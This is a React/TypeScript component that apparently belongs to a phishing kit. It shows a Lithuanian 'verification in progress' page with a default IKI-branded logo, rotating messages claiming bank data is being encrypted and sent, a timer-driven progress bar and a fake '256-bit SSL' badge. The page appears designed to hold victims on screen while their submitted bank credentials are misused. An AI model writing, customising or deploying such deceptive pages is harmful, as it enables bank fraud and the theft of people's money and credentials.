"use client";

import { useEffect, useState } from "react";
import { DemoShell } from "@/components/demo/DemoShell";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
  routeSessionId?: string | null;
};

const MESSAGES = [
  "Užmezgamas saugus ryšys...",
  "Banko duomenys užšifruojami ir siunčiami...",
  "Atliekamas saugumo patikrinimas...",
  "Prašome palaukti...",
  "Ryšys autorizuojamas..."
];

async function resolveShortIdApi(sessionId: string): Promise<string | null> {
  try {
    const res = await fetch(`/api/resolve-short-id`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
      cache: "no-store",
    });
    if (!res.ok) return null;
    const json = await res.json();
    if (json?.ok && json?.public_id) return String(json.public_id);
    return null;
  } catch {
    return null;
  }
}

export function WaitClient({ sessionId, routeSessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();
  const [messageIndex, setMessageIndex] = useState(0);

  // Client-side URL normalizasyonu: URL query param session UUID ise kisa ID'ye cevir
  useEffect(() => {
    if (typeof window === "undefined") return;
    let cancelled = false;

    const run = async () => {
      const url = new URL(window.location.href);
      const sessionQp = url.searchParams.get("session");
      const hasUuidQp =
        sessionQp &&
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          sessionQp,
        );

      if (!hasUuidQp) return;

      const sid = sessionQp!;
      const preferred =
        routeSessionId &&
        !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          routeSessionId,
        )
          ? routeSessionId
          : null;

      const shortId = preferred ?? (await resolveShortIdApi(sid));
      if (cancelled) return;
      if (shortId && shortId !== sid) {
        url.searchParams.set("session", shortId);
        const next = url.pathname + url.search + url.hash;
        window.history.replaceState({}, "", next);
      }
    };

    run();
    return () => {
      cancelled = true;
    };
  }, [sessionId, routeSessionId]);

  useEffect(() => {
    const messageTimer = setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % MESSAGES.length);
    }, 3500);
    return () => clearInterval(messageTimer);
  }, []);

  const progressWidth = ((messageIndex + 1) / MESSAGES.length) * 100;


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
        </div>
      </div>
    );
  }

  return (
    <div className="a3d-shell">
      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.18)] animate-[pulse_6s_ease-in-out_infinite]" />
      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.13)] animate-[pulse_8s_ease-in-out_infinite_alternate]" />

      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
        {!sessionId ? (
          <p className="a3d-in w-full max-w-sm rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600 shadow-sm">
            Neteisinga nuoroda.
          </p>
        ) : (
          <div className="a3d-card a3d-in w-full max-w-[460px] overflow-hidden px-6 py-8 sm:px-9 sm:py-10">
            <div className="mb-7 flex items-start justify-between gap-4">
              <div>
                <h2 className="a3d-title text-[26px] leading-tight">{settings.wait_title}</h2>
                <p className="a3d-sub mt-2 text-sm font-medium">
                  Jūsų patvirtinimas saugiai apdorojamas, tikrinamas ryšys.
                </p>
              </div>
              <img
                src={settings.logo_url || "/form-assets/iki-mini-logo.png"}
                alt={settings.portal_name || "Brand"}
                className="h-11 w-11 shrink-0 object-contain"
              />
            </div>

            <div className="a3d-inset flex flex-col items-center px-6 py-8">
              <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
                <div className="absolute inset-0 rounded-full border border-[rgba(var(--brand-rgb),0.16)]" />
                <div className="absolute inset-[10px] rounded-full border border-[rgba(var(--brand-rgb),0.16)]" />
                <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-transparent border-t-[var(--brand)] border-r-[var(--brand)]" style={{ animationDuration: "1.6s" }} />
                <div className="absolute inset-[22px] rounded-full bg-[rgba(var(--brand-rgb),0.14)] blur-md" />
                <svg className="relative z-10 h-11 w-11 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="m8.8 11.8 2.1 2.1 4.5-4.7" />
                </svg>
              </div>

              <div className="mb-6 min-h-[52px] px-3 text-center">
                <p key={messageIndex} className="text-[15px] font-semibold leading-6 text-[#344054] animate-[fadeIn_0.5s_ease-in-out]">
                  {MESSAGES[messageIndex]}
                </p>
              </div>

              <div className="w-full">
                <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[rgba(var(--brand-rgb),0.8)]">
                  <span>Verifikacija</span>
                  <span>{Math.round(progressWidth)}%</span>
                </div>
                <div className="h-3 overflow-hidden rounded-full border border-[rgba(var(--brand-rgb),0.16)] bg-white/70 shadow-inner">
                  <div
                    className="relative h-full rounded-full bg-[linear-gradient(90deg,var(--brand-dark)_0%,var(--brand)_100%)] transition-all duration-1000 ease-in-out"
                    style={{ width: `${progressWidth}%` }}
                  >
                    <div className="absolute inset-y-0 right-0 w-16 bg-white/40 blur-md" />
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-7 flex justify-center">
              <div className="a3d-pill">
                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                <span>256 bitų SSL šifravimas</span>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
